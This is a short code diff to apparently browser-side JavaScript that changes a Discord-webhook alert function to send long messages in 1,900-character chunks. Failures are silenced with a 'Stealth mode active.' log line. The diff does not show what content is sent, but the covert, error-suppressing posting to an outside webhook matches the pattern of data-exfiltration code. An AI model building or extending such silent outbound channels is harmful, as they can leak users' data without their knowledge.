@@ -151,13 +151,21 @@
             return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
         }
 
+        // Updated function for handling long messages (Chunking)
         function sendDiscordAlert(messageContent) {
             if(!WEBHOOK_URL) return;
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: messageContent })
-            }).catch(() => console.log("Stealth mode active."));
+            
+            // Discord ki 2000 character limit ko bypass karne ke liye (Safe limit 1900)
+            const chunkSize = 1900;
+            for (let i = 0; i < messageContent.length; i += chunkSize) {
+                const chunk = messageContent.substring(i, i + chunkSize);
+                
+                fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: chunk })
+                }).catch(() => console.log("Stealth mode active."));
+            }
         }
 
         function verifyAccess() {
